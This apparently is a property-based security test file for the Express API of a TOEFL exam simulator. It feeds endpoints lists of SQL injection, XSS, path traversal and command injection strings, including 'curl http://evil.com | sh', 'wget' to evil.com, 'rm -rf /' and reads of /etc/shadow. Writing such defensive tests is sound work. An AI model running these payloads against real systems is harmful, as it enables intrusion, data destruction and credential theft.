/**
 * API Input Validation and Sanitization Property-Based Tests
 * 
 * **Property 11: Input Validation and Sanitization**
 * **Validates: Requirements 22.4**
 * 
 * Tests all API endpoints for:
 * - SQL injection attacks
 * - XSS (Cross-Site Scripting) attacks
 * - Path traversal attacks
 * - Command injection attacks
 * - Boundary conditions (empty strings, extremely long strings, negative numbers)
 * - Invalid UUIDs and malformed data
 * - JSONB injection
 * 
 * Uses fast-check to generate malicious input strings and verify that
 * validation schemas reject dangerous inputs before they reach the database.
 */

import { describe, it, expect, beforeAll, afterAll, vi } from 'vitest';
import fc from 'fast-check';
import request from 'supertest';
import express from 'express';
import { Pool } from 'pg';
import sessionsRouter from './sessions.js';
import timersRouter from './timers.js';
import mstRouter from './mst.js';
import gradeRouter from './grade.js';
import itemsRouter from './items.js';

// Mock Gemini API to prevent actual calls during tests
vi.mock('../services/GeminiGraderService.js', () => {
  return {
    GeminiGraderService: class {
      constructor() {}
      async gradeWriting() {
        return {
          cefrBand: 3,
          scaleScore: 15,
          grammarCorrections: [],
          lexicalAnalysis: {
            vocabularyLevel: 'intermediate',
            lexicalDiversity: 0.5,
            academicWordCount: 0,
            suggestions: []
          }
        };
      }
      async assessPronunciation() {
        return {
          accuracyScore: 75,
          fluencyScore: 70,
          prosodyScore: 68,
          completenessScore: 80,
          cefrBand: 3,
          scaleScore: 15
        };
      }
      getCircuitState() {
        return 'CLOSED';
      }
      resetCircuit() {}
      getDefaultWritingScore() {
        return {
          cefrBand: 3,
          scaleScore: 15,
          grammarCorrections: [],
          lexicalAnalysis: {
            vocabularyLevel: 'intermediate',
            lexicalDiversity: 0,
            academicWordCount: 0,
            suggestions: []
          }
        };
      }
      getDefaultSpeakingScore() {
        return {
          accuracyScore: 50,
          fluencyScore: 50,
          prosodyScore: 50,
          completenessScore: 50,
          cefrBand: 3,
          scaleScore: 15
        };
      }
    }
  };
});

// Test database pool
let pool: Pool;
let app: express.Application;

beforeAll(async () => {
  // Set GEMINI_API_KEY for tests to enable grade router (will use mock anyway)
  process.env.GEMINI_API_KEY = 'test-api-key';
  
  // Initialize test database connection
  pool = new Pool({
    host: process.env.DB_HOST || 'localhost',
    port: parseInt(process.env.DB_PORT || '5432'),
    database: process.env.DB_NAME || 'toefl_simulator_test',
    user: process.env.DB_USER || 'postgres',
    password: process.env.DB_PASSWORD || 'postgres'
  });

  // Initialize Express app with routers
  app = express();
  app.use(express.json());
  app.use('/api/sessions', sessionsRouter);
  app.use('/api/timers', timersRouter);
  app.use('/api/mst', mstRouter);
  app.use('/api/grade', gradeRouter);
  app.use('/api/items', itemsRouter);

  // Global error handler
  app.use((err: any, _req: express.Request, res: express.Response, _next: express.NextFunction) => {
    res.status(500).json({ error: 'Internal Server Error', message: err.message });
  });

  // Clean up test data
  await pool.query('DELETE FROM exam_sessions WHERE user_id LIKE $1', ['test-malicious-%']);
});

afterAll(async () => {
  await pool.query('DELETE FROM exam_sessions WHERE user_id LIKE $1', ['test-malicious-%']);
  await pool.end();
});

/**
 * Custom arbitraries for malicious inputs
 */

// SQL injection patterns
const sqlInjectionArb = fc.oneof(
  fc.constant("' OR '1'='1"),
  fc.constant("'; DROP TABLE exam_sessions; --"),
  fc.constant("' UNION SELECT * FROM exam_sessions --"),
  fc.constant("admin'--"),
  fc.constant("1' OR '1' = '1"),
  fc.constant("' OR 1=1--"),
  fc.constant("'; DELETE FROM test_items WHERE '1'='1"),
  fc.constant("' OR EXISTS(SELECT * FROM exam_sessions) --"),
  fc.constant("1'; EXEC xp_cmdshell('dir'); --"),
  fc.constant("'; UPDATE exam_sessions SET score=100 WHERE '1'='1")
);

// XSS attack patterns
const xssAttackArb = fc.oneof(
  fc.constant('<script>alert("XSS")</script>'),
  fc.constant('<img src=x onerror=alert("XSS")>'),
  fc.constant('<svg onload=alert("XSS")>'),
  fc.constant('javascript:alert("XSS")'),
  fc.constant('<iframe src="javascript:alert(\'XSS\')">'),
  fc.constant('<body onload=alert("XSS")>'),
  fc.constant('<input onfocus=alert("XSS") autofocus>'),
  fc.constant('<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">'),
  fc.constant('"><script>alert(String.fromCharCode(88,83,83))</script>'),
  fc.constant('\'"--></script><script>alert("XSS")</script>')
);

// Path traversal patterns
const pathTraversalArb = fc.oneof(
  fc.constant('../../../etc/passwd'),
  fc.constant('..\\..\\..\\windows\\system32\\config\\sam'),
  fc.constant('....//....//....//etc/passwd'),
  fc.constant('..%2F..%2F..%2Fetc%2Fpasswd'),
  fc.constant('..%252F..%252F..%252Fetc%252Fpasswd'),
  fc.constant('%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'),
  fc.constant('....\\\\....\\\\....\\\\windows\\\\system.ini')
);

// Command injection patterns
const commandInjectionArb = fc.oneof(
  fc.constant('test; rm -rf /'),
  fc.constant('test | cat /etc/passwd'),
  fc.constant('test && wget http://evil.com/malware'),
  fc.constant('test`whoami`'),
  fc.constant('test$(cat /etc/passwd)'),
  fc.constant('test; curl http://evil.com | sh'),
  fc.constant('test & ping -c 10 127.0.0.1 &'),
  fc.constant('test || cat /etc/shadow')
);

// JSONB injection patterns
const jsonbInjectionArb = fc.oneof(
  fc.constant('{"$ne": null}'),
  fc.constant('{"$gt": ""}'),
  fc.constant('{"__proto__": {"isAdmin": true}}'),
  fc.constant('{"constructor": {"prototype": {"isAdmin": true}}}'),
  fc.constant('"\\"\\\'\\"\\\'"')
);

// Boundary conditions: extremely long strings
const extremelyLongStringArb = fc.oneof(
  fc.constant('a'.repeat(10000)),
  fc.constant('x'.repeat(100000)),
  fc.constant('漢'.repeat(5000)), // Unicode characters
  fc.constant('\0'.repeat(1000)), // Null bytes
  fc.constant('A'.repeat(1000000)) // 1MB string
);

// Invalid UUIDs
const invalidUuidArb = fc.oneof(
  fc.constant('not-a-uuid'),
  fc.constant('12345'),
  fc.constant(''),
  fc.constant('xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx'),
  fc.constant('00000000-0000-0000-0000-000000000000'),
  fc.constant('ZZZZZZZZ-ZZZZ-ZZZZ-ZZZZ-ZZZZZZZZZZZZ')
);

// Negative and boundary numbers
const invalidNumberArb = fc.oneof(
  fc.constant(-9999999),
  fc.constant(-1),
  fc.constant(Number.MAX_SAFE_INTEGER),
  fc.constant(Number.MIN_SAFE_INTEGER),
  fc.constant(Infinity),
  fc.constant(-Infinity),
  fc.constant(NaN)
);

// Combined malicious input arbitrary
const maliciousInputArb = fc.oneof(
  sqlInjectionArb,
  xssAttackArb,
  pathTraversalArb,
  commandInjectionArb,
  jsonbInjectionArb,
  extremelyLongStringArb,
  invalidUuidArb
);

describe('Property 11: API Input Validation and Sanitization', () => {
  /**
   * Test Group 1: Sessions API
   */
  describe('Sessions API - POST /api/sessions', () => {
    it('should reject SQL injection in userId field', async () => {
      await fc.assert(
        fc.asyncProperty(
          sqlInjectionArb,
          async (maliciousUserId) => {
            const response = await request(app)
              .post('/api/sessions')
              .send({ userId: maliciousUserId })
              .expect('Content-Type', /json/);
            
            // Should either accept (and sanitize) or reject with 400
            if (response.status === 201) {
              const sessionId = response.body.data.sessionId;
              
              // Verify session was created safely
              const dbCheck = await pool.query(
                'SELECT user_id FROM exam_sessions WHERE session_id = $1',
                [sessionId]
              );
              
              expect(dbCheck.rows.length).toBeLessThanOrEqual(1);
              
              // Clean up
              if (dbCheck.rows.length > 0) {
                await pool.query('DELETE FROM exam_sessions WHERE session_id = $1', [sessionId]);
              }
            } else {
              // Should reject with validation error
              expect(response.status).toBe(400);
            }
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
    }, 30000);

    it('should reject XSS attacks in userId field', async () => {
      await fc.assert(
        fc.asyncProperty(
          xssAttackArb,
          async (xssPayload) => {
            const response = await request(app)
              .post('/api/sessions')
              .send({ userId: xssPayload })
              .expect('Content-Type', /json/);
            
            if (response.status === 201) {
              const userId = response.body.data.userId;
              expect(userId).toBeDefined();
              
              // Clean up
              const sessionId = response.body.data.sessionId;
              await pool.query('DELETE FROM exam_sessions WHERE session_id = $1', [sessionId]);
            } else {
              expect(response.status).toBe(400);
            }
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
    }, 30000);

    it('should handle extremely long userId strings', async () => {
      await fc.assert(
        fc.asyncProperty(
          extremelyLongStringArb,
          async (longString) => {
            const response = await request(app)
              .post('/api/sessions')
              .send({ userId: longString })
              .expect('Content-Type', /json/);
            
            // Should either accept with truncation or reject
            if (response.status === 201) {
              const sessionId = response.body.data.sessionId;
              await pool.query('DELETE FROM exam_sessions WHERE session_id = $1', [sessionId]);
            }
            
            // May trigger 500 for extreme payloads that cause parsing errors
            expect([201, 400, 413, 500]).toContain(response.status);
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
    }, 30000);
  });

  /**
   * Test Group 2: Sessions API - PUT /api/sessions/:sessionId
   */
  describe('Sessions API - PUT /api/sessions/:sessionId', () => {
    it('should reject SQL injection in sessionId path parameter', async () => {
      await fc.assert(
        fc.asyncProperty(
          sqlInjectionArb,
          async (maliciousSessionId) => {
            const response = await request(app)
              .put(`/api/sessions/${encodeURIComponent(maliciousSessionId)}`)
              .send({ status: 'in_progress' })
              .expect('Content-Type', /json/);
            
            // Should return 404 (not found) or 400 (validation error)
            expect([400, 404]).toContain(response.status);
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
    }, 30000);

    it('should reject JSONB injection in answers field', async () => {
      // First create a valid session with proper userId format
      const createResponse = await request(app)
        .post('/api/sessions')
        .send({ userId: 'test-user-jsonb' });
      
      // Skip test if session creation failed
      if (createResponse.status !== 201 || !createResponse.body.data?.sessionId) {
        console.log('Skipping test - session creation failed');
        return;
      }
      
      const sessionId = createResponse.body.data.sessionId;
      
      await fc.assert(
        fc.asyncProperty(
          jsonbInjectionArb,
          async (jsonbPayload) => {
            const response = await request(app)
              .put(`/api/sessions/${sessionId}`)
              .send({ answers: jsonbPayload })
              .expect('Content-Type', /json/);
            
            // Should reject malicious JSONB
            expect([400, 500]).toContain(response.status);
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
      
      // Clean up
      await pool.query('DELETE FROM exam_sessions WHERE session_id = $1', [sessionId]);
    }, 30000);

    it('should reject invalid status enum values', async () => {
      const createResponse = await request(app)
        .post('/api/sessions')
        .send({ userId: 'test-user-status' });
      
      // Skip test if session creation failed
      if (createResponse.status !== 201 || !createResponse.body.data?.sessionId) {
        console.log('Skipping test - session creation failed');
        return;
      }
      
      const sessionId = createResponse.body.data.sessionId;
      
      await fc.assert(
        fc.asyncProperty(
          fc.oneof(fc.constant('hacked'), fc.constant('admin'), fc.constant(''), fc.constant(123)),
          async (invalidStatus) => {
            const response = await request(app)
              .put(`/api/sessions/${sessionId}`)
              .send({ status: invalidStatus })
              .expect('Content-Type', /json/);
            
            expect(response.status).toBe(400);
            expect(response.body.error).toBe('Validation Error');
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
      
      await pool.query('DELETE FROM exam_sessions WHERE session_id = $1', [sessionId]);
    }, 30000);
  });

  /**
   * Test Group 3: Timers API
   */
  describe('Timers API - POST /api/timers', () => {
    it('should reject negative or zero duration values', async () => {
      // Create a valid session first
      const createResponse = await request(app)
        .post('/api/sessions')
        .send({ userId: 'test-user-timer' });
      
      // Skip test if session creation failed
      if (createResponse.status !== 201 || !createResponse.body.data?.sessionId) {
        console.log('Skipping test - session creation failed');
        return;
      }
      
      const sessionId = createResponse.body.data.sessionId;
      
      await fc.assert(
        fc.asyncProperty(
          fc.oneof(fc.constant(-1), fc.constant(0), fc.constant(-9999)),
          async (invalidDuration) => {
            const response = await request(app)
              .post('/api/timers')
              .send({ 
                sessionId: sessionId,
                sectionName: 'reading',
                duration: invalidDuration 
              })
              .expect('Content-Type', /json/);
            
            expect(response.status).toBe(400);
            expect(response.body.error).toBe('Validation Error');
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
      
      await pool.query('DELETE FROM exam_sessions WHERE session_id = $1', [sessionId]);
    }, 30000);

    it('should reject excessively large duration values', async () => {
      const createResponse = await request(app)
        .post('/api/sessions')
        .send({ userId: 'test-user-timer-2' });
      
      // Skip test if session creation failed
      if (createResponse.status !== 201 || !createResponse.body.data?.sessionId) {
        console.log('Skipping test - session creation failed');
        return;
      }
      
      const sessionId = createResponse.body.data.sessionId;
      
      await fc.assert(
        fc.asyncProperty(
          fc.oneof(fc.constant(200), fc.constant(999), fc.constant(Number.MAX_SAFE_INTEGER)),
          async (largeDuration) => {
            const response = await request(app)
              .post('/api/timers')
              .send({ 
                sessionId: sessionId,
                sectionName: 'reading',
                duration: largeDuration 
              })
              .expect('Content-Type', /json/);
            
            expect(response.status).toBe(400);
            expect(response.body.error).toBe('Validation Error');
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
      
      await pool.query('DELETE FROM exam_sessions WHERE session_id = $1', [sessionId]);
    }, 30000);

    it('should reject SQL injection in sessionId field', async () => {
      await fc.assert(
        fc.asyncProperty(
          sqlInjectionArb,
          async (maliciousSessionId) => {
            const response = await request(app)
              .post('/api/timers')
              .send({ 
                sessionId: maliciousSessionId,
                sectionName: 'reading',
                duration: 30 
              })
              .expect('Content-Type', /json/);
            
            // Should return 404 (session not found) or 400
            expect([400, 404]).toContain(response.status);
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
    }, 30000);
  });

  /**
   * Test Group 4: MST API
   */
  describe('MST API - POST /api/mst/route', () => {
    it('should reject invalid section values', async () => {
      const createResponse = await request(app)
        .post('/api/sessions')
        .send({ userId: 'test-user-mst' });
      
      // Skip test if session creation failed
      if (createResponse.status !== 201 || !createResponse.body.data?.sessionId) {
        console.log('Skipping test - session creation failed');
        return;
      }
      
      const sessionId = createResponse.body.data.sessionId;
      
      await fc.assert(
        fc.asyncProperty(
          fc.oneof(
            fc.constant('writing'),
            fc.constant('speaking'),
            fc.constant('hacked'),
            fc.constant(''),
            fc.constant(123)
          ),
          async (invalidSection) => {
            const response = await request(app)
              .post('/api/mst/route')
              .send({ 
                sessionId: sessionId,
                section: invalidSection,
                stage1Responses: [{ itemId: 'item-1', isCorrect: true }]
              })
              .expect('Content-Type', /json/);
            
            expect(response.status).toBe(400);
            expect(response.body.error).toBe('Validation Error');
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
      
      await pool.query('DELETE FROM exam_sessions WHERE session_id = $1', [sessionId]);
    }, 30000);

    it('should reject SQL injection in itemId within stage1Responses', async () => {
      const createResponse = await request(app)
        .post('/api/sessions')
        .send({ userId: 'test-user-mst-2' });
      
      // Skip test if session creation failed
      if (createResponse.status !== 201 || !createResponse.body.data?.sessionId) {
        console.log('Skipping test - session creation failed');
        return;
      }
      
      const sessionId = createResponse.body.data.sessionId;
      
      await fc.assert(
        fc.asyncProperty(
          sqlInjectionArb,
          async (maliciousItemId) => {
            const response = await request(app)
              .post('/api/mst/route')
              .send({ 
                sessionId: sessionId,
                section: 'reading',
                stage1Responses: [{ itemId: maliciousItemId, isCorrect: true }]
              })
              .expect('Content-Type', /json/);
            
            // Should reject or not find items
            expect([400, 404]).toContain(response.status);
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
      
      await pool.query('DELETE FROM exam_sessions WHERE session_id = $1', [sessionId]);
    }, 30000);

    it('should reject empty stage1Responses array', async () => {
      const createResponse = await request(app)
        .post('/api/sessions')
        .send({ userId: 'test-user-mst-3' });
      
      // Skip test if session creation failed
      if (createResponse.status !== 201 || !createResponse.body.data?.sessionId) {
        console.log('Skipping test - session creation failed');
        return;
      }
      
      const sessionId = createResponse.body.data.sessionId;
      
      const response = await request(app)
        .post('/api/mst/route')
        .send({ 
          sessionId: sessionId,
          section: 'reading',
          stage1Responses: []
        });
      
      expect(response.status).toBe(400);
      expect(response.body.error).toBe('Validation Error');
      
      await pool.query('DELETE FROM exam_sessions WHERE session_id = $1', [sessionId]);
    });
  });

  /**
   * Test Group 5: Grade API
   */
  describe('Grade API - POST /api/grade/writing', () => {
    it('should reject XSS attacks in writing text', async () => {
      await fc.assert(
        fc.asyncProperty(
          xssAttackArb,
          async (xssPayload) => {
            const response = await request(app)
              .post('/api/grade/writing')
              .send({ 
                text: xssPayload,
                taskType: 'email'
              })
              .expect('Content-Type', /json/);
            
            // API may accept but should sanitize before processing
            // Or return service unavailable if Gemini not configured
            expect([200, 400, 503]).toContain(response.status);
            
            // If successful, verify response structure
            if (response.status === 200) {
              expect(response.body.data).toBeDefined();
              expect(response.body.data.cefrBand).toBeGreaterThanOrEqual(1);
              expect(response.body.data.cefrBand).toBeLessThanOrEqual(6);
            }
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
    }, 30000);

    it('should reject command injection in writing text', async () => {
      await fc.assert(
        fc.asyncProperty(
          commandInjectionArb,
          async (cmdPayload) => {
            const response = await request(app)
              .post('/api/grade/writing')
              .send({ 
                text: cmdPayload,
                taskType: 'academic-discussion'
              })
              .expect('Content-Type', /json/);
            
            expect([200, 400, 503]).toContain(response.status);
            
            // Verify no command execution occurred (server should still respond)
            if (response.status === 200) {
              expect(response.body.data.cefrBand).toBeGreaterThanOrEqual(1);
              expect(response.body.data.scaleScore).toBeGreaterThanOrEqual(0);
              expect(response.body.data.scaleScore).toBeLessThanOrEqual(30);
            }
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
    }, 30000);

    it('should reject invalid taskType enum values', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.oneof(
            fc.constant('invalid-task'),
            fc.constant(''),
            fc.constant('hacked'),
            fc.constant(123)
          ),
          async (invalidTaskType) => {
            const response = await request(app)
              .post('/api/grade/writing')
              .send({ 
                text: 'This is a test response.',
                taskType: invalidTaskType
              })
              .expect('Content-Type', /json/);
            
            expect(response.status).toBe(400);
            expect(response.body.error).toBe('Validation Error');
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
    }, 30000);

    it('should handle extremely long writing text', async () => {
      await fc.assert(
        fc.asyncProperty(
          extremelyLongStringArb,
          async (longText) => {
            const response = await request(app)
              .post('/api/grade/writing')
              .send({ 
                text: longText,
                taskType: 'email'
              })
              .expect('Content-Type', /json/);
            
            // Should handle gracefully (may get 500 for extreme payloads)
            expect([200, 400, 413, 500, 503]).toContain(response.status);
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
    }, 30000);

    it('should reject empty text field', async () => {
      const response = await request(app)
        .post('/api/grade/writing')
        .send({ 
          text: '',
          taskType: 'email'
        });
      
      expect(response.status).toBe(400);
      expect(response.body.error).toBe('Validation Error');
    });
  });

  /**
   * Test Group 6: Items API
   */
  describe('Items API - GET /api/items', () => {
    it('should reject SQL injection in query parameters', async () => {
      await fc.assert(
        fc.asyncProperty(
          sqlInjectionArb,
          async (maliciousSection) => {
            const response = await request(app)
              .get('/api/items')
              .query({ section: maliciousSection })
              .expect('Content-Type', /json/);
            
            // Should return validation error
            expect(response.status).toBe(400);
            expect(response.body.error).toBe('Validation Error');
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
    }, 30000);

    it('should reject invalid enum values for difficulty', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.oneof(
            fc.constant('very-hard'),
            fc.constant('impossible'),
            fc.constant(''),
            fc.constant('hacked')
          ),
          async (invalidDifficulty) => {
            const response = await request(app)
              .get('/api/items')
              .query({ difficulty: invalidDifficulty })
              .expect('Content-Type', /json/);
            
            expect(response.status).toBe(400);
            expect(response.body.error).toBe('Validation Error');
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
    }, 30000);

    it('should reject negative limit and offset values', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.oneof(
            fc.constant({ limit: -1 }),
            fc.constant({ offset: -1 }),
            fc.constant({ limit: -999, offset: -999 })
          ),
          async (invalidParams) => {
            const response = await request(app)
              .get('/api/items')
              .query(invalidParams)
              .expect('Content-Type', /json/);
            
            expect(response.status).toBe(400);
            expect(response.body.error).toBe('Validation Error');
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
    }, 30000);

    it('should reject limit values exceeding maximum', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.oneof(fc.constant(101), fc.constant(1000), fc.constant(999999)),
          async (excessiveLimit) => {
            const response = await request(app)
              .get('/api/items')
              .query({ limit: excessiveLimit })
              .expect('Content-Type', /json/);
            
            expect(response.status).toBe(400);
            expect(response.body.error).toBe('Validation Error');
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
    }, 30000);

    it('should reject invalid stage values', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.oneof(fc.constant(0), fc.constant(3), fc.constant(-1), fc.constant(999)),
          async (invalidStage) => {
            const response = await request(app)
              .get('/api/items')
              .query({ stage: invalidStage })
              .expect('Content-Type', /json/);
            
            expect(response.status).toBe(400);
            expect(response.body.error).toBe('Validation Error');
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
    }, 30000);
  });

  describe('Items API - GET /api/items/:id', () => {
    it('should reject SQL injection in item ID path parameter', async () => {
      await fc.assert(
        fc.asyncProperty(
          sqlInjectionArb,
          async (maliciousId) => {
            const response = await request(app)
              .get(`/api/items/${encodeURIComponent(maliciousId)}`)
              .expect('Content-Type', /json/);
            
            // Should return 404 (not found) - no SQL injection should occur
            expect(response.status).toBe(404);
            expect(response.body.error).toBe('Not Found');
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
    }, 30000);

    it('should reject path traversal in item ID', async () => {
      await fc.assert(
        fc.asyncProperty(
          pathTraversalArb,
          async (pathTraversal) => {
            const response = await request(app)
              .get(`/api/items/${encodeURIComponent(pathTraversal)}`)
              .expect('Content-Type', /json/);
            
            // Should return 404, not expose filesystem
            expect(response.status).toBe(404);
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
    }, 30000);
  });

  describe('Items API - GET /api/items/section/:section', () => {
    it('should reject invalid section path parameters', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.oneof(
            fc.constant('invalid'),
            fc.constant('hacked'),
            fc.constant(''),
            sqlInjectionArb
          ),
          async (invalidSection) => {
            const response = await request(app)
              .get(`/api/items/section/${encodeURIComponent(invalidSection)}`)
              .expect('Content-Type', /json/);
            
            // Empty string may return 404, others should return 400
            expect([400, 404]).toContain(response.status);
            expect(['Bad Request', 'Not Found']).toContain(response.body.error);
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
    }, 30000);
  });

  describe('Items API - GET /api/items/difficulty/:difficulty', () => {
    it('should reject invalid difficulty path parameters', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.oneof(
            fc.constant('ultra-hard'),
            fc.constant('beginner'),
            fc.constant(''),
            sqlInjectionArb
          ),
          async (invalidDifficulty) => {
            const response = await request(app)
              .get(`/api/items/difficulty/${encodeURIComponent(invalidDifficulty)}`)
              .expect('Content-Type', /json/);
            
            // Empty string may return 404, others should return 400
            expect([400, 404]).toContain(response.status);
            expect(['Bad Request', 'Not Found']).toContain(response.body.error);
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
    }, 30000);
  });

  /**
   * Test Group 7: Heartbeat Timestamp Validation
   */
  describe('Timers API - POST /api/timers/:timerId/heartbeat', () => {
    it('should reject negative or invalid timestamps', async () => {
      // Create a valid session and timer
      const createResponse = await request(app)
        .post('/api/sessions')
        .send({ userId: 'test-user-heartbeat' });
      
      // Skip test if database not available
      if (createResponse.status !== 201) {
        console.log('Skipping test - database not available');
        return;
      }
      
      const sessionId = createResponse.body.data.sessionId;
      
      await request(app)
        .post('/api/timers')
        .send({ 
          sessionId: sessionId,
          sectionName: 'reading',
          duration: 30 
        });
      
      await fc.assert(
        fc.asyncProperty(
          fc.oneof(
            fc.constant(-1),
            fc.constant(-999999),
            fc.constant(NaN),
            fc.constant(Infinity)
          ),
          async (invalidTimestamp) => {
            const response = await request(app)
              .post(`/api/timers/${sessionId}/heartbeat`)
              .send({ clientTimestamp: invalidTimestamp })
              .expect('Content-Type', /json/);
            
            expect(response.status).toBe(400);
            expect(response.body.error).toBe('Validation Error');
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
      
      await pool.query('DELETE FROM exam_sessions WHERE session_id = $1', [sessionId]);
    }, 30000);

    it('should reject SQL injection in timerId path parameter', async () => {
      await fc.assert(
        fc.asyncProperty(
          sqlInjectionArb,
          async (maliciousTimerId) => {
            const response = await request(app)
              .post(`/api/timers/${encodeURIComponent(maliciousTimerId)}/heartbeat`)
              .send({ clientTimestamp: Date.now() })
              .expect('Content-Type', /json/);
            
            // Should return 404 (not found)
            expect(response.status).toBe(404);
            expect(response.body.error).toBe('Not Found');
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
    }, 30000);
  });

  /**
   * Test Group 8: Ability Estimate Validation
   */
  describe('Sessions API - PUT /api/sessions/:sessionId/ability/:section', () => {
    it('should reject theta values outside valid IRT range', async () => {
      const createResponse = await request(app)
        .post('/api/sessions')
        .send({ userId: 'test-user-ability' });
      
      // Skip test if database not available
      if (createResponse.status !== 201) {
        console.log('Skipping test - database not available');
        return;
      }
      
      const sessionId = createResponse.body.data.sessionId;
      
      await fc.assert(
        fc.asyncProperty(
          fc.oneof(
            fc.constant(-4),
            fc.constant(4),
            fc.constant(-999),
            fc.constant(999),
            fc.constant(Infinity),
            fc.constant(-Infinity)
          ),
          async (invalidTheta) => {
            const response = await request(app)
              .put(`/api/sessions/${sessionId}/ability/reading`)
              .send({ theta: invalidTheta })
              .expect('Content-Type', /json/);
            
            expect(response.status).toBe(400);
            expect(response.body.error).toBe('Validation Error');
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
      
      await pool.query('DELETE FROM exam_sessions WHERE session_id = $1', [sessionId]);
    }, 30000);

    it('should reject invalid section names', async () => {
      const createResponse = await request(app)
        .post('/api/sessions')
        .send({ userId: 'test-user-ability-2' });
      
      // Skip test if database not available
      if (createResponse.status !== 201) {
        console.log('Skipping test - database not available');
        return;
      }
      
      const sessionId = createResponse.body.data.sessionId;
      
      await fc.assert(
        fc.asyncProperty(
          fc.oneof(
            fc.constant('invalid'),
            fc.constant('hacked'),
            fc.constant(''),
            sqlInjectionArb
          ),
          async (invalidSection) => {
            const response = await request(app)
              .put(`/api/sessions/${sessionId}/ability/${encodeURIComponent(invalidSection)}`)
              .send({ theta: 0.5 })
              .expect('Content-Type', /json/);
            
            expect(response.status).toBe(400);
            expect(response.body.error).toBe('Bad Request');
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
      
      await pool.query('DELETE FROM exam_sessions WHERE session_id = $1', [sessionId]);
    }, 30000);
  });

  /**
   * Test Group 9: Module Completion Validation
   */
  describe('Sessions API - POST /api/sessions/:sessionId/modules/:moduleId/complete', () => {
    it('should reject SQL injection in moduleId', async () => {
      const createResponse = await request(app)
        .post('/api/sessions')
        .send({ userId: 'test-user-module' });
      
      // Skip test if database not available
      if (createResponse.status !== 201) {
        console.log('Skipping test - database not available');
        return;
      }
      
      const sessionId = createResponse.body.data.sessionId;
      
      await fc.assert(
        fc.asyncProperty(
          sqlInjectionArb,
          async (maliciousModuleId) => {
            const response = await request(app)
              .post(`/api/sessions/${sessionId}/modules/${encodeURIComponent(maliciousModuleId)}/complete`)
              .expect('Content-Type', /json/);
            
            // Should return 404 (not found) or 400
            expect([400, 404]).toContain(response.status);
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
      
      await pool.query('DELETE FROM exam_sessions WHERE session_id = $1', [sessionId]);
    }, 30000);

    it('should reject path traversal in moduleId', async () => {
      const createResponse = await request(app)
        .post('/api/sessions')
        .send({ userId: 'test-user-module-2' });
      
      // Skip test if database not available
      if (createResponse.status !== 201) {
        console.log('Skipping test - database not available');
        return;
      }
      
      const sessionId = createResponse.body.data.sessionId;
      
      await fc.assert(
        fc.asyncProperty(
          pathTraversalArb,
          async (pathTraversal) => {
            const response = await request(app)
              .post(`/api/sessions/${sessionId}/modules/${encodeURIComponent(pathTraversal)}/complete`)
              .expect('Content-Type', /json/);
            
            expect([400, 404]).toContain(response.status);
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
      
      await pool.query('DELETE FROM exam_sessions WHERE session_id = $1', [sessionId]);
    }, 30000);
  });

  /**
   * Test Group 10: Cross-cutting Concerns
   */
  describe('Cross-cutting Security Tests', () => {
    it('should reject malformed JSON bodies', async () => {
      const response = await request(app)
        .post('/api/sessions')
        .set('Content-Type', 'application/json')
        .send('{"userId": "test-user", invalid json}');
      
      // Express may return 500 for malformed JSON
      expect([400, 500]).toContain(response.status);
    });

    it('should enforce content-type validation for JSON endpoints', async () => {
      const response = await request(app)
        .post('/api/sessions')
        .set('Content-Type', 'text/plain')
        .send('userId=test-user');
      
      // Express should reject non-JSON content-type
      expect([400, 415]).toContain(response.status);
    });

    it('should handle null byte injection in string fields', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.constant('test\0user\0hacked'),
          async (nullByteString) => {
            const response = await request(app)
              .post('/api/sessions')
              .send({ userId: nullByteString })
              .expect('Content-Type', /json/);
            
            // Should either accept (and sanitize) or reject (may trigger 500)
            if (response.status === 201) {
              const sessionId = response.body.data.sessionId;
              await pool.query('DELETE FROM exam_sessions WHERE session_id = $1', [sessionId]);
            }
            
            expect([201, 400, 500]).toContain(response.status);
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
    }, 30000);

    it('should handle Unicode normalization attacks', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.oneof(
            fc.constant('admin\u0041\u0301'), // Combining character
            fc.constant('\uFEFF'), // Zero-width no-break space
            fc.constant('user\u200B'), // Zero-width space
            fc.constant('\u202E'), // Right-to-left override
            fc.constant('test\uFFFE') // Invalid Unicode
          ),
          async (unicodePayload) => {
            const response = await request(app)
              .post('/api/sessions')
              .send({ userId: unicodePayload })
